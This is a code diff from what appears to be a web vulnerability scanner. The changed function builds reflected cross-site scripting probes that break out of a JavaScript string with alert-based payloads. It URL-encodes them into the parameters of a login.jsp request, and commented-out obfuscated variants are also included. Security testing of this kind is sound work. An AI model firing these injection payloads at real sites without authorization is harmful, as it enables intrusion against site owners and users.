@@ -187,7 +187,7 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 	/*
 	top[8680439..toString`30`]`7`;
 	*/
-	s = '"}alert`12`;if(1){//';// new Function`al\ert\`6\``
+	s = `\`<>"'%()&+\\`;//'"}alert`12`;if(1){//';// new Function`al\ert\`6\``
 	var sxPay = encodeURIComponent(s);//("null\";</" + g_ScrIpt + ">" + s);
 	
 	url = aH + url + "/login.jsp?samelogin=" + sxPay + "&style=" + sxPay;
